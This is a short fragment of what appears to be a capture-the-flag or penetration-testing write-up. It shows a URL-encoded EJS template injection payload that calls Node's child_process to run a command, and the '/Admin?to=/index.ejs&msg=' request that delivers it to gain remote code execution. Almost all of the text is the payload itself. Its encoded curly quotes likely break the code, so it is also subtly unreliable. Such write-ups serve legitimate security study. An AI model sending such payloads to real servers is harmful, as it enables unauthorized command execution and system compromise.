...
URL encode it:
```
%3C%25-%20require%28%E2%80%98child_process%E2%80%99%29.exec%28%E2%80%98id%E2%80%99%29%20%25%3E
```

Then, send the payload like this:
```
/Admin?to=/index.ejs&msg=%3C%25-%20require%28%E2%80%98child_process%E2%80%99%29.exec%28%E2%80%98id%E2%80%99%29%20%25%3E
```

This should allow us to inject and execute the malicious code to get RCE.
